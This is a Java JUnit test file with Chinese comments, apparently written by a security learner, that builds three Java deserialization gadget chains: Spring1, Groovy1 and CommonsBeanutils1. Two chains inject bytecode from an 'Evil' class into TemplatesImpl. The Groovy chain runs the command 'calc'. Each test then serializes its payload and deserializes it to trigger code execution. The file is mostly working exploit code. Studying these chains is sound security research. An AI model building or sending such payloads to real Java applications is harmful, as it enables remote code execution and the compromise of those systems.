package com.endlessshw.serialization.test;

import cn.hutool.core.lang.hash.Hash;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.beanutils.BeanComparator;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;
import org.codehaus.groovy.runtime.ConvertedClosure;
import org.codehaus.groovy.runtime.MethodClosure;
import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.ObjectFactory;

import javax.xml.transform.Templates;
import java.lang.reflect.*;
import java.util.Comparator;
import java.util.HashMap;
import java.util.Map;
import java.util.PriorityQueue;

import static com.endlessshw.serialization.util.SerializeUtil.serialize;
import static com.endlessshw.serialization.util.SerializeUtil.unSerialize;

/**
 * @author hasee
 * @version 1.0
 * @description: TODO
 * @date 2024/10/21 18:47
 */
public class GadgetsTest2 {

    @Test
    public void testSpring1() throws Exception {
        // 想让 this.provider.getType() 返回 templatesImpl（TemplatesImpl 具体对象），那就代理该方法，MethodInvokeTypeProvider.provider 使用代理对象，从而修改返回值
        // 但是用 AnnotationInvocationHandler 直接修改不行，因为类不匹配。
        // 只能说通过 AnnotationInvocationHandler 代理 getType() 以传入一个代理类，这个代理类代理了 Type 和 Templates 接口，让其能够调用 newTransformer() 方法（但不是恶意 templatesImpl 的）。
        // 由于不是恶意的 templatesImpl，因此如果这个代理类的 InvocationHandler 要是还能够调用 templatesImpl.newTransformer 就更好了。
        // 而这个代理类的 InvocationHandler 就是 ObjectFactoryDelegatingInvocationHandler。通过其 invoke 来触发漏洞，而想让它来触发漏洞，就需要两个条件：
        // 1. 触发 invoke 的条件是它要作为 InvocationHandler，代理方法 newTransformer()，这一点和上文说的相呼应。
        // 2. this.objectFactory.getObject() 返回的是 templatesImpl。因为它是泛型，所以可以使用 AnnotationInvocationHandler 来进行修改。

        // 1. 读取恶意类 bytes[]
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.getCtClass("com.endlessshw.serialization.util.Evil");
        byte[] bytes = ctClass.toBytecode();

        // 2. 构造 sink
        TemplatesImpl templatesImpl = new TemplatesImpl();
        // 要求 1 - 注入恶意字节码
        Field bytecodesField = templatesImpl.getClass().getDeclaredField("_bytecodes");
        bytecodesField.setAccessible(true);
        bytecodesField.set(templatesImpl, new byte[][]{bytes});
        // 要求 2 - 保证 _name 不为 null
        Field nameField = templatesImpl.getClass().getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templatesImpl, "EndlessShw");

        // 3. 先把两个 AnnotationInvocationHandler 创建出来，以供使用
        Class<?> aIHClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> aIHClassDeclaredConstructor = aIHClass.getDeclaredConstructor(Class.class, Map.class);
        aIHClassDeclaredConstructor.setAccessible(true);
        // 第一个要修改 this.objectFactory.getObject()，返回的是 templatesImpl
        HashMap<Object, Object> mapGO = new HashMap<>();
        mapGO.put("getObject", templatesImpl);
        InvocationHandler invocationHandlerGO = (InvocationHandler) aIHClassDeclaredConstructor.newInstance(Override.class, mapGO);
        ObjectFactory<?> objectFactory = (ObjectFactory<?>) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{ObjectFactory.class}, invocationHandlerGO);

        // 4. 第二个要修改 this.provider.getType()，同时还需要代理类。所以还得先创建代理类，所使用的 InvocationHandler 为 ObjectFactoryDelegatingInvocationHandler
        Class<?> ofdIHClass = Class.forName("org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler");
        Constructor<?> ofdIHClassDeclaredConstructor = ofdIHClass.getDeclaredConstructor(ObjectFactory.class);
        ofdIHClassDeclaredConstructor.setAccessible(true);
        InvocationHandler invocationHandlerOF = (InvocationHandler) ofdIHClassDeclaredConstructor.newInstance(objectFactory);
        // 创建了代理类
        Type type = (Type) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Type.class, Templates.class}, invocationHandlerOF);

        // 5. 接着完善第二个 AnnotationInvocationHandler，它将代理 this.provider.getType() 方法并修改其返回值
        HashMap<Object, Object> mapGT = new HashMap<>();
        mapGT.put("getType", type);
        InvocationHandler invocationHandlerGT = (InvocationHandler) aIHClassDeclaredConstructor.newInstance(Override.class, mapGT);
        Class<?> typeProviderClass = Class.forName("org.springframework.core.SerializableTypeWrapper$TypeProvider");
        Object typeProvider = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{typeProviderClass}, invocationHandlerGT);

        // 6. 构造 sink
        // 这里 TypeProvider 还是内部静态接口，不好直接用 TypeProvider.class，然后它构造函数好像就一个
        Class<?> mityClass = Class.forName("org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider");
        Constructor<?> typeProviderClassDeclaredConstructor = mityClass.getDeclaredConstructors()[0];
        typeProviderClassDeclaredConstructor.setAccessible(true);
        // 把 kick-off 中的 provider 改成修改了返回值后的 provider，这样才能使得 this.provider.getType() 返回想要的值
        // MethodInvokeTypeProvider 的构造函数调用了一次 ReflectionUtils.invokeMethod()，所以先不让它触发链，然后后面通过反射修改
        Object tobeSerialized = typeProviderClassDeclaredConstructor.newInstance(typeProvider, Object.class.getMethod("toString"), 0);
        Field methodNameField = mityClass.getDeclaredField("methodName");
        methodNameField.setAccessible(true);
        methodNameField.set(tobeSerialized, "newTransformer");

        String serialize = serialize(tobeSerialized);
        unSerialize(serialize);

    }

    @Test
    public void testGroovy() throws Exception {
        // 1. 先构造 sink 和 chain1
        MethodClosure methodClosure = new MethodClosure("calc", "execute");

        // 2. 构造 chain2 - ConvertedClosure 和代理需要的 Map
        ConvertedClosure convertedClosure = new ConvertedClosure(methodClosure, "entrySet");
        // 后面的参数填 null 也行，反正目的就是绕过那个 if
        // ConvertedClosure convertedClosure = new ConvertedClosure(methodClosure, null);
        HashMap<Object, Object> hashMap = new HashMap<>();
        hashMap.put("EndlessShw", "EndlessShw");
        // 构造代理，将 ConvertedClosure 当作处理类
        Map<?, ?> map = (Map<?, ?>) Proxy.newProxyInstance(hashMap.getClass().getClassLoader(), hashMap.getClass().getInterfaces(), convertedClosure);

        // 3. 回到 kick-off，先反射创建 AnnotationInvocationHandler
        Class<?> aihClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> aihClassConstructor = aihClass.getDeclaredConstructor(Class.class, Map.class);
        aihClassConstructor.setAccessible(true);
        Object aih = aihClassConstructor.newInstance(Override.class, map);

        String serialize = serialize(aih);
        unSerialize(serialize);
    }

    @Test
    public void testCB() throws Exception{
        // 1. 读取恶意类 bytes[]
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.getCtClass("com.endlessshw.serialization.util.Evil");
        byte[] bytes = ctClass.toBytecode();

        // 2. 构造 sink
        TemplatesImpl templates = new TemplatesImpl();
        // 要求 1 - 注入恶意字节码
        Field bytecodesField = templates.getClass().getDeclaredField("_bytecodes");
        bytecodesField.setAccessible(true);
        bytecodesField.set(templates, new byte[][]{bytes});
        // 要求 2 - 保证 _name 不为 null
        Field nameField = templates.getClass().getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates, "EndlessShw");

        // 3. 构造 chain - BeanComparator
        // 通过反射来获取 java.util.Collections$ReverseComparator 或者 java.lang.String$CaseInsensitiveComparator
        Class<?> reverseComparatorClass = Class.forName("java.util.Collections$ReverseComparator");
        Constructor<?> rcConstructorField = reverseComparatorClass.getDeclaredConstructor();
        rcConstructorField.setAccessible(true);
        Comparator<?> reverseComparator = (Comparator<?>) rcConstructorField.newInstance();
        BeanComparator<Object> objectBeanComparator = new BeanComparator<>("outputProperties", reverseComparator);

        // 4. 构造 kick-off
        PriorityQueue<Object> priorityQueue = new PriorityQueue<>();
        priorityQueue.add("1");
        priorityQueue.add("2");
        Field queueField = priorityQueue.getClass().getDeclaredField("queue");
        queueField.setAccessible(true);
        Object[] objects = (Object[]) queueField.get(priorityQueue);
        objects[0] = templates;

        // 5. 将 kick-off 和 chain 相连
        Field comparatorField = priorityQueue.getClass().getDeclaredField("comparator");
        comparatorField.setAccessible(true);
        comparatorField.set(priorityQueue, objectBeanComparator);

        String serialize = serialize(priorityQueue);
        unSerialize(serialize);
    }
}
